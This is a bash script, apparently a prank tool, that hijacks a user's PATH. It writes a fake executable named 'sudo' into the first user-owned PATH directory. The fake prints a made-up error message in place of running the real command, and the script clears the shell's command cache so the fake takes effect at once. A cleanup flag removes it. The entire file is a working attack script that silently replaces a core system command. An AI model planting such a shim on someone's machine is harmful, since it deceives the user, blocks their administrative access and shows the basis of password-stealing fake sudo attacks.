#!/usr/bin/env bash

USER_DIRECTORY_IN_PATH=""
FAKE_ERROR_MESSAGE="10d20d7815 EXCEPTION unknown \(0313\)"

# Get the first local directory in the path
set_user_directory_in_path() {
    IFS=:
    for section in $PATH; do
        if [[ $section == *$USER* ]]; then
            USER_DIRECTORY_IN_PATH=$section
            break
        fi
    done
}

exit_if_no_user_directory_in_path() {
    if [ -z "$USER_DIRECTORY_IN_PATH" ]; then
        echo "Error: No user directory found in \$PATH."
        exit 1
    fi
}

spawn_evil_sudo() {
    exec 3<>$USER_DIRECTORY_IN_PATH/sudo

    echo "# Evil Sudo" >&3
    echo "sleep 1" >&3
    echo "echo $FAKE_ERROR_MESSAGE" >&3

    exec 3>&-

    chmod +x $USER_DIRECTORY_IN_PATH/sudo

    echo 😈
}

clean_up() {
    if test -f $USER_DIRECTORY_IN_PATH/sudo && grep -q "Evil Sudo" $USER_DIRECTORY_IN_PATH/sudo; then
        rm $USER_DIRECTORY_IN_PATH/sudo
    fi
}

set_user_directory_in_path
exit_if_no_user_directory_in_path

# Clean up if asked
if [ "$1" == "--clean" ] || [ "$1" == "-c" ]; then
    clean_up
    echo "🧹"
    exit
fi

if [ ! -z "$1" ]; then
    FAKE_ERROR_MESSAGE=$1
fi

clean_up
spawn_evil_sudo
hash -r
